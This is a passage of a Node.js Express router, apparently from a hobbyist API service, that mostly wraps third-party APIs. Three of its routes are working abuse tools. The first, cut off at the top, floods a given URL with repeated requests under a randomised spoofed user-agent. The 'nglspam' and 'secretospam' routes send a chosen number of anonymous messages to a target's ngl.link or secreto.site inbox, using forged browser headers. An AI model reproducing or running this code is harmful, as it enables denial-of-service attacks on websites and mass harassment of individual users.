Chrome/44.0.2403.125 Safari/537.36', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; .NET4.0E)', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:34.0) Gecko/20100101 Firefox/34.0', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.76 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.87 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; PRU_IE; rv:11.0) like Gecko', 'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.120 Chrome/37.0.2062.120 Safari/537.36', 'Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12H321 [FBAN/FBIOS;FBAV/38.0.0.6.79;FBBV/14316658;FBDV/iPad4,1;FBMD/iPad;FBSN/iPhone OS;FBSV/8.4.1;FBSS/2; FBCR/;FBID/tablet;FBLC/en_US;FBOP/1]', 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174', 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; NP02; rv:11.0) like Gecko', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36', 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Trident/4.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)', 'Mozilla/5.0 (X11; CrOS x86_64 6946.63.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:37.0) Gecko/20100101 Firefox/37.0', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.0.9895 Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.4.4; Nexus 7 Build/KTU84P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.2.2; QMV7B Build/JDQ39) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.114 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MASMJS; rv:11.0) like Gecko', 'Mozilla/5.0 (compatible; MSIE 10.0; AOL 9.7; AOLBuild 4343.1028; Windows NT 6.1; WOW64; Trident/7.0)', 'Mozilla/5.0 (Linux; U; Android 4.0.3; en-us) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.59 Mobile Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; Touch; TNJB; rv:11.0) like Gecko', 'Mozilla/5.0 (iPad; CPU OS 8_1_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Mobile/12B466', 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; Active Content Browser)', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)', 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36', 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; InfoPath.3)', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Win64; x64; Trident/6.0; WebView/1.0)', 'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.89 Safari/537.36', 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.91 Safari/537.36', 'Mozilla/5.0 (iPad; U; CPU OS 5_0 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9A334 Safari/7534.48.3', 'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) coc_coc_browser/50.0.125 Chrome/44.0.2403.125 Safari/537.36', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET4.0C; .NET4.0E)', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; MAARJS; rv:11.0) like Gecko', 'Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) GSA/7.0.55539 Mobile/12H143 Safari/600.1.4']
        let ranuseragent = useragentnya[Math.floor(Math.random() * useragentnya.length)]
        console.log(`[ SPAM ] Spamming To : ${url}`)

        function iyakak() {
            for (let i = 0; i < spam; i++) {
                fetch(url, {
                    "headers": {
                        "user-agent": ranuseragent
                    }
                })
            }
        }
        var startings = setInterval(function() {
            iyakak();
        }, delay)

        function stopping() {
            clearInterval(startings)
        }
        setTimeout(function iyakak() {
            stopping()
        }, timeout)
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/other/github-stalk', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.username
    if (!apikey) return res.json(loghandler.noapikey)
    if (!text) return res.json({
        status: false,
        creator: `${creator}`,
        message: "masukan parameter username"
    })
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://github-api-zhirrr.vercel.app/api/detailuser?q=${text}`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                res.json({
                    author: creator,
                    result
                })
            })
            .catch(e => {
                console.log(e);
                res.json(loghandler.error)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/other/ssweb', async (req, res, next) => {
    var apikey = req.query.apikey
    var url = req.query.url
    if (!apikey) return res.json(loghandler.noapikey)
    if (!url) return res.json({
        status: false,
        creator: `${creator}`,
        message: "Where's the link?"
    })
    if (listkey.includes(apikey)) {
        lol = await getBuffer(`https://image.thum.io/get/fullpage/${url}`)
        await fs.writeFileSync(__path + '/tmp/ssweb.jpeg', lol)
        res.sendFile(__path + '/tmp/ssweb.jpeg')
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/other/toanime', async (req, res, next) => {
    var apikey = req.query.apikey
    var url = req.query.url
    if (!apikey) return res.json(loghandler.noapikey)
    if (!url) return res.json({
        status: false,
        creator: `${creator}`,
        message: "Where's the link?"
    })
    if (listkey.includes(apikey)) {
        lol = await getBuffer(`https://api.lolhuman.xyz/api/imagetoanime?apikey=${lolkey}&img=${url}`)
        await fs.writeFileSync(__path + '/tmp/toanime.jpeg', lol)
        res.sendFile(__path + '/tmp/toanime.jpeg')
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/other/openai-chat', async (req, res, next) => {
          var apikey = req.query.apikey
       	var text = req.query.text
       	if(!apikey) return res.json(loghandler.noapikey)
        if(!text) return res.json({ status : false, creator : `${creator}`, message : "Example : cat flying"})
        if(listkey.includes(apikey)){
lol = await fetchJson(`https://api.lolhuman.xyz/api/openai?apikey=${lolkey}&text=${text}&user=user-unique-id`).then((result) => {
res.json(result)
})
} else {
  res.json(loghandler.apikey)
}
})
router.get('/other/nglspam', async (req, res, next) => {
    var apikey = req.query.apikey
    var m1 = req.query.username
    var m2 = req.query.message
    var m3 = req.query.total
    if (!apikey) return res.json(loghandler.noapikey)
    if (!m1 && !m2 && !m3) return res.json({
        status: false,
        creator: `${creator}`,
        message: "Example : username|messages|total"
    })
    if (listkey.includes(apikey)) {
        total = `${encodeURI(m3)}`
        for (let i = 0; i < total; i++) {
            await fetch("https://ngl.link/api/submit", {
                "headers": {
                    "accept": "*/*",
                    "accept-language": "en-US,en;q=0.7",
                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "sec-gpc": "1",
                    "x-requested-with": "XMLHttpRequest"
                },
                "referrer": `https://ngl.link/${m1}`,
                "referrerPolicy": "strict-origin-when-cross-origin",
                "body": `username=${m1}&question=${m2}&deviceId=23d7346e-7d22-4256-80f3-dd4ce3fd8878&gameSlug=&referrer=`,
                "method": "POST",
                "mode": "cors",
                "credentials": "include"
            }).catch((err) => res.json({
                status: false,
                creator: `${creator}`,
                result: `Error, Please Try Again Later.`
            }))
        }
        var resultbes = (`Success Sending Messages NGL To UserName : ${m1} | Messages : ${m2} | Total : ${m3}`)
        res.json({
            status: true,
            creator: `${creator}`,
            result: `${resultbes}`
        })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/other/secretospam', async (req, res, next) => {
    var apikey = req.query.apikey
    var m1 = req.query.id
    var m2 = req.query.message
    var m3 = req.query.total
    if (!apikey) return res.json(loghandler.noapikey)
    if (!m1 && !m2 && !m3) return res.json({
        status: false,
        creator: `${creator}`,
        message: `Example : ID|messages|total\n\nHow to get ID? go to your secreto site then click developer tools and then send a message, after that back to developer tools u will see sendMessage header, press it and then press payload you will see your secreto ID.`
    })
    if (listkey.includes(apikey)) {
        total = `${encodeURI(m3)}`
        for (let i = 0; i < total; i++) {
            await fetch("https://api.secreto.site/sendmsg", {
                "headers": {
                    "accept": "*/*",
                    "accept-language": "en-US,en",
                    "content-type": "application/json",
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-site",
                    "sec-gpc": "1"
                },
                "referrer": "https://secreto.site/",
                "referrerPolicy": "strict-origin-when-cross-origin",
                "body": `{\"id\":\"${m1}\",\"message\":\"${m2}\"}`,
                "method": "POST",
                "mode": "cors",
                "credentials": "omit"
            }).catch((err) => res.json({
                status: false,
                creator: `${creator}`,
                result: `Error, Please Try Again Later.`
            }))
        }
        var resultnyes = (`Success Sending Messages Secreto To ID : ${m1} | Messages : ${m2} | Total : ${m3}`)
        res.json({
            status: true,
            creator: `${creator}`,
            result: `${resultnyes}`
        })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/other/kodepos', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.kota
    if (!apikey) return res.json(loghandler.noapikey)
    if (!text) return res.json({
        status: false,
        creator: `${creator}`,
        message: "masukan parameter kota"
    })
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://kodepos-api-zhirrr.vercel.app/?q=${text}`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                res.json({
                    result
                })
            })
            .catch(e => {
                console.log(e);
                res.json(loghandler.error)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/other/covid-world', async (req, res, next) => {
    var apikey = req.query.apikey
    var text = req.query.kata
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        fetch(encodeURI(`https://covid19-api-zhirrr.vercel.app/api/world`))
            .then(response => response.json())
            .then(data => {
                var result = data;
                res.json({
                    result
                })
            })
            .catch(e => {
                console.log(e);
                res.json(loghandler.error)
            })
    } else {
        res.json(loghandler.apikey)
    }
})
router.get('/other/simi', async (req, res, next) => {
    var apikey = req.query.apikey
    var kata = req.query.kata
    if (!apikey) return res.json(loghandler.noapikey)
    if (listkey.includes(apikey)) {
        mek = await fetchJson(`https://api.simsimi.net/v2/?text=${kata}&lc=id`)
        lols = mek.success
        res.json({
            status: true,
            creator: `${creator}`,
            message: lols
        })
    } else {
        res.json(loghandler.apikey)
    }
})

module.exports = router
